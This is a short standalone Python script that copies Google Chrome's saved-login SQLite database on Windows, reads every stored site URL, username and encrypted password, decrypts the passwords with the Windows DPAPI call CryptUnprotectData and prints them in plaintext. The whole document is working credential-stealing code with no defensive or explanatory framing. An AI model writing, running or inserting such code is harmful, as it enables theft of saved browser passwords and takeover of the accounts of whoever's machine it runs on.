import os, sqlite3, win32crypt
import shutil

chrome_db = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\Login Data")
temp_db = "ChromeTemp.db"
shutil.copy2(chrome_db, temp_db)

conn = sqlite3.connect(temp_db)
cursor = conn.cursor()

cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

for row in cursor.fetchall():
    url, username, encrypted_password = row
    try:
        decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
        print(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n")
    except:
        print(f"Could not decrypt password for {url}\n")

conn.close()
os.remove(temp_db)
